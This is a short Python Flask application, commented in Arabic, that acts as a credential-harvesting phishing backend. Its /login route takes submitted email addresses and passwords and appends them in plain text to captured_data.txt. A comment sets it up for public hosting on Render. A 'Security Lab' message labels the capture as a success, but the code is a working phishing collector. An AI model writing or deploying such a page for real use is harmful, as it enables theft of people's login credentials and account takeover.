import os
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # حفظ البيانات في ملف نصي
    with open("captured_data.txt", "a", encoding="utf-8") as f:
        f.write(f"Email: {email} | Password: {password}\n")
    
    return "<h1>Security Lab: Data captured successfully!</h1><p>Check your logs or captured_data.txt</p>"

if __name__ == '__main__':
    # إعداد مهم لـ Render لقراءة المنفذ تلقائياً
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
